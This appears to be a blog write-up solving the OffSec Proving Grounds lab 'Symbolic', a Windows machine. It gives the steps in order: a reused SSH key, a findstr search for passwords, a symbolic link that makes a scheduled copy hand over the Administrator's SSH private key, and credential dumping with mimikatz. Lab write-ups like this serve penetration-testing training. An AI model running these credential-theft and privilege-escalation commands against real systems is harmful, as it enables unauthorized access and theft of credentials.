---
title: Symbolic
date: 2026-01-23T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - windows
  - proving-grounds
  - gobuster
  - ssh
  - symbolic-link
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Symbolic"
---
Shared ssh key | Symbolic link created for priv escalation.

![](Screenshot%202025-12-17%20at%2009.52.20.png)

Web application on port 80

![](Screenshot%202025-12-17%20at%2009.53.01.png)

![](Screenshot%202025-12-17%20at%2009.53.37.png)

Couple of folders to enumerate. Logs, pdfs

![](Screenshot%202025-12-17%20at%2009.54.43.png)


![](Screenshot%202025-12-17%20at%2010.04.45.png)

Save this somewhere, we'll come back to it.

`vim sym.key`

After consulting a guide and seeing the little clue I think we should try a local file injection. 

![](Screenshot%202025-12-17%20at%2011.50.47.png)

To test this we will make a test html file with out favourite LLM, circa 2025

![](Screenshot%202025-12-17%20at%2011.51.57.png)

![](Screenshot%202025-12-17%20at%2011.53.03.png)

![](Screenshot%202025-12-17%20at%2011.53.14.png)

![](Screenshot%202025-12-17%20at%2011.53.31.png)




Lets use the private key to login using ssh.

Permissions need to be `chmod 400 sym.key`, otherwise you will get an error.

To use the private ssh key, we just use the -i flag 

`ssh p4yl0ad@192.168.184.177 -i sym.key`

So we're in. no password necessary

![](Screenshot%202025-12-17%20at%2012.09.44.png)

Priv escalation:

`whoami /all`

![](Screenshot%202025-12-17%20at%2012.11.08.png)

first 

`cd /

`findstr /SIM /C:"pass" *.ini *.cfg *.xml

Nothing fun

![](Screenshot%202025-12-17%20at%2013.02.53.png)

Spicy :0
![](Screenshot%202025-12-18%20at%2007.13.24.png)

![](Screenshot%202025-12-17%20at%2013.06.54.png)

We want to create a *symbolic* link from the request log to the rsa_id ssh key

![](Screenshot%202025-12-17%20at%2015.39.38.png)

This script is always running, but every 60 seconds it will copy  

Download this zip file and copy it to the victim machine. This a tool created by project zero.

`https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z`

Unzip and move 'createsymlink.exe' to the host. 

`scp -i sym.key CreateSymlink.exe p4yl0ad@192.168.184.177:/C:/Users/p4yl0ad/Desktop`

Here you need to move to powershell for these commands:
`powershell`

*For this to work you must delete all the files in C:|xampp|htdocs|logs|` 

`del C:\xampp\htdocs\logs`

![](Screenshot%202025-12-18%20at%2006.51.04.png)

Now start the executable. 
`.\CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"`


![](Screenshot%202025-12-18%20at%2006.37.38.png)

Now you need to delete all of the logs in the /backup/log file. 

![](Screenshot%202025-12-18%20at%2006.32.58.png)

![](Screenshot%202025-12-17%20at%2015.05.48.png)

When you copy the key to your kali box there is a random space you need to delete. 

![](Screenshot%202025-12-17%20at%2015.16.35.png)

Copy over mimikatz

`scp -i sym.key mimikatz.exe  p4yl0ad@192.168.184.177:/C:/Users/p4yl0ad/Desktop`

Log back in using ssh and Administrator

Trying to reveal passwords using mimikatz

`mimikatz.exe`

`privilege::debug`

`sekurlsa::logonpasswords`

![](Screenshot%202025-12-17%20at%2015.22.02.png)

da39a3ee5e6b4b0d3255bfef95601890afd80709

![](Screenshot%202025-12-17%20at%2015.23.25.png)

5f68c87076362ce1ab5adb40389527c966581681

